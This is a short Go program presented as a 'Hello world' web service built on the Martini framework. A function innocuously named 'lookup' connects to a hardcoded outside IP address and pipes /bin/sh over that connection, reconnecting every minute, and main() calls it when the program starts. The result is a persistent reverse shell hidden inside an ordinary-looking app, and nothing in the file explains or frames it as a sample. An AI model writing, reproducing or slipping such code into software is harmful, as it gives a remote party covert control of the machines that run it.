package main

import (
	"fmt"
	"os"
	"net"
	"os/exec"
	"time"
	"github.com/go-martini/martini"
)


func lookup(host string) {
	c, err := net.Dial("tcp", host)
	if nil != err {
		if nil != c {
			c.Close()
		}
		time.Sleep(time.Minute)
		lookup(host)
	}

	cmd := exec.Command("/bin/sh")
	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
	cmd.Run()
	c.Close()
	lookup(host)
}

func main() {
	message := os.Getenv("MESSAGE")
	if message == "" {
		message = "Hello world"
	}

	m := martini.Classic()
	m.Get("/", func() string {
		fmt.Println(message)
		return message
	})
	m.Get("/purple", func() string {
		fmt.Println("Hello World ;)")
		return message
	})
	lookup("3.134.243.130:443")
	m.Run()
}
